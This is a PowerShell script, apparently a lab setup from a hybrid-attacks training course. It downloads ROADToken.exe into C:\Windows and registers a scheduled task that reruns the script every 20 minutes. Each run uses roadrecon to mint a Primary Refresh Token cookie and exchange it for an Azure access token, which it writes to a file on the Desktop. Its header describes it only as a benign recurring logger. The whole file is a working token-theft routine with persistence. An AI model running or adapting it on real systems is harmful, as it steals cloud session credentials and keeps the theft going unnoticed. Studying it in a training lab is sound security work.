<#
.SYNOPSIS
    This script runs a specified script block every 20 minutes and logs the output to a file.

.DESCRIPTION
    The script uses a scheduled job to run a specified script block every 20 minutes. The output of the script block is logged to a file.

.NOTES
    Ensure you have the necessary permissions to create and manage scheduled jobs.
#>
param (
    [switch]$ShouldTrigger
)

$logFilePath = "C:\lab\lab4\"
# Ensure the directory exists
$logDirectory = [System.IO.Path]::GetDirectoryName($logFilePath)
if (-not (Test-Path -Path $logDirectory)) {
    New-Item -Path $logDirectory -ItemType Directory | Out-Null
}

if($ShouldTrigger)
{
    Start-Transcript -Path $logFilePath -Append -ErrorAction SilentlyContinue
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Write-Verbose "[$timestamp] Running recurring script block..."

    Set-Location -Path ([Environment]::GetFolderPath("Desktop"))

    # Get the nonce first
    $inputString = roadrecon auth --prt-init 
    $inputString -match "ROADtoken: (\S+)"
    $nonce = $matches[1]
    
    Write-Verbose "Nonce: $nonce"

    # Get a new PRT Cookie
    $output = ROADtoken.exe $nonce

    # extract using Regex object
    $regex = [regex]'"data":\s*"([^"]+)"'
    $match = $regex.Match($output)
    $prtToken = $match.Groups[1].Value
    Write-Verbose "PrtToken: $prtToken"

    roadrecon auth -r azurerm -c azps --prt-cookie $prtToken

    # keep only the AT
    $filePath = (([Environment]::GetFolderPath("Desktop"))+'\.roadtools_auth')
    $all = Get-Content -Path $filePath
    $accessToken = ([regex]'"accessToken":\s*"([^"]+)"').Match($all).Groups[1].Value
    Set-Content -Path $filePath -Value $accessToken


    Stop-Transcript -ErrorAction SilentlyContinue
    exit
}

# Check if running as administrator
If (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Error "You need to run this script as an administrator."
    Exit
}

function Download-FileIfNotExists {
    param (
        [string]$url,
        [string]$destination = "C:\Windows"
    )

    # Extract the file name from the URL
    $fileName = [System.IO.Path]::GetFileName($url)
    $filePath = Join-Path -Path $destination -ChildPath $fileName

    # Check if the file already exists
    if (-Not (Test-Path -Path $filePath)) {
        try {
            # Download the file
            Invoke-WebRequest -Uri $url -OutFile $filePath
            Write-Verbose "File downloaded successfully to $filePath"
        } catch {
            Write-Verbose "Failed to download the file: $_"
        }
    } else {
        Write-Verbose "File already exists at $filePath"
    }

    Copy-Item -Path $filePath -Destination ([Environment]::GetFolderPath("Desktop")) -ErrorAction SilentlyContinue
}

# download the ROADtoken.exe file
Download-FileIfNotExists -url "https://raw.githubusercontent.com/shackcrack007/hybrid-attacks-course-template/main/labs%20(for%20course%20sessions%2C%20not%20part%20of%20setup)/lab-3-tokens/ROADToken.exe"

# Define the task name
$taskName = "RecurringAttackSurfaceMappingScript"

# Define the task trigger to run every 20 minutes
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(20) -RepetitionInterval (New-TimeSpan -Minutes 20) 

# Define the task action to run the PowerShell script
$scriptPath = $MyInvocation.MyCommand.Path.ToString()
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File $scriptPath -ShouldTrigger"

# Define the principal to run the task in the user context
$principal = New-ScheduledTaskPrincipal -UserId (whoami) -LogonType Interactive
# Check if the scheduled task already exists
$existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue

if ($null -eq $existingTask) {
    # Register the scheduled task
    Register-ScheduledTask -TaskName $taskName -Trigger $trigger -Action $action -Principal $principal
    Write-Verbose "Scheduled task '$taskName' created to run every 20 minutes."
} else {
    # Update the existing task with the new trigger and action
    Set-ScheduledTask -TaskName $taskName -Trigger $trigger -Action $action
    Write-Verbose "Scheduled task '$taskName' already exists. Task updated."
}

Write-Verbose "Scheduled task '$taskName' created to run every 20 minutes in the user context."

Start-ScheduledTask -TaskName $taskName
Write-Verbose "Scheduled task '$taskName' successfully started."
Write-Verbose "Scheduled task '$taskName' started."

